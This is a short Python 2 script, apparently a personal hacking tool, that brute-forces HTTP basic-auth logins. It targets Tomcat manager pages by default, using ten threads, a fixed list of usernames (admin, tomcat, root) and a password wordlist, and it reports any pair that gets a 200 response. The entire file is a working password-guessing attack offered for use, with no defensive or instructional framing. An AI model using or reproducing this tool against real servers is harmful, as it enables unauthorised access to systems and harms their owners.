#!/usr/bin/env python
# encoding:utf8
import requests
import Queue
from threading import Thread
import sys

__author__ = 'kkk'
__date__ = '2016/5/24'

user_list = ['admin','tomcat','root']

if len(sys.argv) < 2:
    print "------------------burst auth--------------------"
    print "[*] {0} url dict_file".format(sys.argv[0])
    print "[*] Default Password is fuckserver.txt."
    print "[*] python goauth.py http://xxx.com/manager/html password.txt"
    print "[===================><=======================]"
    exit(0)

url = sys.argv[1]
default_file = 'E:\Tools\PassList\Passwords\\fuckserver.txt'

dict_file = sys.argv[2] if len(sys.argv) == 3 else default_file

queue = Queue.Queue()

with open(dict_file,'r') as f:
    for line in f.readlines():
        queue.put(line.rstrip())

def do(password):
    for user in user_list:
        auth = (user,password)
        try:
            r = requests.get(url, auth=auth)
        except:
            print "[-] url is error!"
            exit(1)
        #print "cracking {0}:{1} ".format(user,password)
        sys.stdout.write('\r{0} '.format(password))
        if r.status_code == 200:
            print "[+] auth--> {0}:{1}".format(user,password)
           # exit(0)

def scan():
    while not queue.empty():
        do(queue.get())

def main():
    threads_list = []
    threads = 10

    for i in range(threads):
        t = Thread(target=scan)
        t.start()
        threads_list.append(t)

    for i in range(threads):
        threads_list[i].join()

if __name__ == '__main__':
    main()
